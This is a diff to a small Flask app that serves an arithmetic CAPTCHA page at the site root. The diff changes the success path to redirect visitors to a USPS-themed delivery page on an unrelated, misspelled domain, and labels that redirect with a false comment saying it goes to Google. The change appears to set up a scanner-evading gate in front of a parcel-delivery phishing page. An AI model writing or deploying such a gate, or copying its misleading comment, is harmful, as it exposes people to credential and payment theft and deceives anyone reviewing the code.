@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, render_template_string
+from flask import Flask, request, render_template_string, redirect
 
 app = Flask(__name__)
 
@@ -11,7 +11,7 @@ CAPTCHA_PAGE = """
 </head>
 <body>
     <h1>CAPTCHA Verification</h1>
-    <p>Please solve the CAPTCHA to proceed to the main site.</p>
+    <p>Please solve the CAPTCHA to proceed.</p>
     <form method="POST" action="/verify-captcha">
         <label for="captcha">What is 5 + 3?</label>
         <input type="text" id="captcha" name="captcha" required>
@@ -21,7 +21,7 @@ CAPTCHA_PAGE = """
 </html>
 """
 
-@app.route('/captcha')
+@app.route('/')
 def captcha():
     # Render the CAPTCHA page
     return render_template_string(CAPTCHA_PAGE)
@@ -31,7 +31,7 @@ def verify_captcha():
     # Check the CAPTCHA answer
     answer = request.form.get('captcha')
     if answer == "8":  # Correct answer to the CAPTCHA
-        return "CAPTCHA solved! Welcome to the site!"
+        return redirect("https://africamuslsimsagency.com/delivery/usps_latest/uspshome/")  # Redirect to Google
     else:
         return "CAPTCHA failed. Please try again.", 400
 
